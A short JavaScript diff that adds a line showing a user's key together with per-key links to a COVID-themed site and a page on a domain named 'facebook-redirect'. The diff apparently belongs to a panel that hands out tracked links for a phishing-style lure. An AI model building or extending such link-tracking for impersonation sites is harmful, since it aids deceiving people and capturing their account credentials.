@@ -20,6 +20,8 @@ var i=1;
 					if(childSnapshot.key==submittedKey){
 						var childData=childSnapshot.val();
 						$("#userTxt").html("User: "+childData["Name"]);
+						$("#textGenerated").html("<b>Key:</b> "+submittedKey+"<br><b>Main Website:</b> https://covid19-global-insider.000webhostapp.com?k="+submittedKey+"<br><b>Your account page:</b> https://facebook-redirect.now.sh/accounts?k="+submittedKey);
+
 						ref="/private/users/"+submittedKey+"/";
 					}
 					
